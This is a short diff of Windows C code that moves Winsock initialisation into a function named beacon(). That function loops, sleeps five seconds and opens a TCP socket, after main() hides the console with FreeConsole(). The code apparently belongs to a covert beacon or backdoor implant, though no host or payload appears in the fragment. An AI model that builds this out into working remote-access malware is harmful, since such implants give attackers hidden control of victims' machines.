@@ -7,14 +7,7 @@
 
 int main(int argc, char* argv[])
 {
-  WSADATA wsa;
-
   FreeConsole();
-
-  /* initialize win sock version*/
-  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-    exit(0);
-
   beacon();
 }
 
@@ -25,10 +18,15 @@ static void beacon()
   struct sockaddr_in server;
   char reply_buffer[1024]= {0};
   int recv_size;
+  WSADATA wsa;
 
   while (1)
     {
       Sleep(5000);
+
+      /* initialize win sock version*/
+      if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+	exit(0);
 
       if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
 			    NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
